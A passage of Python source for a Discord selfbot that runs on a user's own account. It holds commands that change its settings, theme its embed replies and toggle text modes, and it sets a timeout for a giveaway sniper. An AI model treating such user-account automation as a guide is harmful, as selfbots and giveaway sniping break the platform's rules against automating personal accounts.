                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Delete timeout set to `{timeout}` seconds'
                await ctx.send(msg)
        except TypeError:
            pass
        
    @React.command(aliases=['gtimeout'], usage="giveawaytimeout <Seconds>", description="Sets the Giveaway sniper timeout")
    async def giveawaytimeout(ctx, timeout: int):
        try:
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_timeout'] = int(timeout)
            
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Timeout', description=f'Giveaway sniping timeout set to {timeout} seconds',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Giveaway sniping timeout set to `{timeout}` seconds'
                await ctx.send(msg)
        except TypeError:
            pass
    
        
    @React.command(usage="changeprefix <New Prefix>", description="Changes selfbot prefix")
    async def changeprefix(ctx, toprefix):
        try:
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['prefix'] = toprefix
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            prefix = toprefix
            React.command_prefix = prefix
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Change Prefix', description=f'Selfbot prefix changed to {toprefix}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Selfbot prefix changed to `{toprefix}`'
                await ctx.send(msg)
        except TypeError:
            pass
        
    @React.command(usage="afkmsg <New Message>", description="Change your AFK auto-reply message")
    async def afkmsg(ctx, *, newmessage):
        try:
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['afk_message'] = newmessage
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'AFK Message', description=f'Selfbot AFK message changed to {newmessage}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Selfbot AFK message changed to `{newmessage}`'
                await ctx.send(msg)
        except TypeError:
            pass
        
    @React.command(usage="globalemoji <New Emoji>", description="Sets the global emoji")
    async def globalemoji(ctx, *, newemoji):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['global_emoji'] = newemoji
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Global Emoji', description=f'Global Emoji set to {newemoji}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Global Emoji set to `{newemoji}`'
                await ctx.send(msg)
        except TypeError:
            pass
    
    @React.command(usage="sbtitle <New Title>", description="Sets the selfbot title")
    async def sbtitle(ctx, *, newtitle):
        try:
        
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_title'] = newtitle
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Title', description=f'Selfbot Title set to {newtitle}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Selfbot Title set to `{newtitle}`'
                await ctx.send(msg)
        except Exception:
            pass
        
    @React.command(usage="embedcolor <Hexcode>", description="Change the embed color")
    async def embedcolor(ctx, hexcode):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_color'] = hexcode
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Color', description=f'Embed color set to {hexcode}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Embed color set to `{hexcode}`'
                await ctx.send(msg)
        except TypeError:
            pass
        
    @React.command(usage="embedthumbnail <URL>", description="Change the embed thumbnail icon")
    async def embedthumbnail(ctx, url):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_thumbnail_url'] = url
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Thumbnail', description=f'Embed thumbnail set to {url}',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Embed thumbnail set to `{url}`'
                await ctx.send(msg)
        except TypeError:
            pass
        
    @React.command(usage="embedfootericon <URL>", description="Change the embed footer icon")
    async def embedfootericon(ctx, url):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_footer_url'] = url
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Footer Icon', description=f'Embed footer icon set to {url}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass

    @React.command(usage="embedtitleurl <URL>", description="Change the embed title URL")
    async def embedtitleurl(ctx, url):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_title_url'] = url
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Title URL', description=f'Embed title URL set to {url}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass

    @React.command(usage="embedauthoricon <URL>", description="Change the embed author icon")
    async def embedauthoricon(ctx, url):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_author_icon_url'] = url
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Author Icon', description=f'Embed author icon set to {url}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass

    @React.command(usage="embedauthorurl <URL>", description="Change the embed author URL")
    async def embedauthorurl(ctx, url):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_author_url'] = url
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Author URL', description=f'Embed author URL set to {url}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass
        
    @React.command(usage="embedfooter <Text>", description="Change the embed footer text")
    async def embedfooter(ctx, *, text):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_footer'] = text
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Footer Text', description=f'Embed footer text set to {text}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass

    @React.command(usage="embedauthorname <Name>", description="Change the embed author name")
    async def embedauthorname(ctx, *, name):
        try:
                
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'r') as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_author_name'] = name
            
            with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', 'w') as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Author Name', description=f'Embed author name set to {name}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

        except TypeError:
            pass

    @React.command(usage="uwumode", description="Toggles UwU Mode")
    async def uwumode(ctx):
        global uwu_stat
        if uwu_stat == 0:
            uwu_stat += 1
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'UwU Mode', description='Every message `now gets UwUfied`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'`Every message now gets UwUfied`'
                await ctx.send(msg)
                
        elif uwu_stat == 1:
            uwu_stat -= 1
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'UwU Mode', description='Every message `now doesn\'t get UwUfied`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'`Every message now doesn\'t get UwUfied`'
                await ctx.send(msg)

    @React.command(usage="mockmode", description="Toggles Mock Mode")
    async def mockmode(ctx):
        global mock_stat
        if mock_stat == 0:
            mock_stat += 1
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mock Mode', description='Every message `now gets Mocked`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        elif mock_stat == 1:
            mock_stat -= 1
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mock Mode', description='Every message `now doesn\'t get Mocked`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

    def UwUText(text):
        length = len(text)
        output_text = ''

        for i in range(length):
            current_char = text[i]
            previous_char = '&# 092;&# 048;'

            if i > 0:
                previous_char = text[i - 1]
            
            if current_char == 'L' or current_char == 'R':
                output_text += 'W'

            elif current_char == 'l' or current_char == 'r':
                output_text += 'w'
            
            elif current_char == 'O' or current_char == 'o': 
                if previous_char == 'N' or previous_char == 'n' or previous_char == 'M' or previous_char == 'm': 
                    output_text += "yo"
                else: 
                    output_text += current_char 
            
            else:
                output_text += current_char
            
        return output_text
    
    @React.command(usage="stopbot", description="Stops the bot")
    async def stopbot(ctx):
        await ctx.message.delete()
        await asyncio.sleep(1)
        sys.exit(0)
        
    @React.command(usage="restartbot", description="Restarts the Selfbot")
    async def restartbot(ctx):
        await ctx.message.delete()
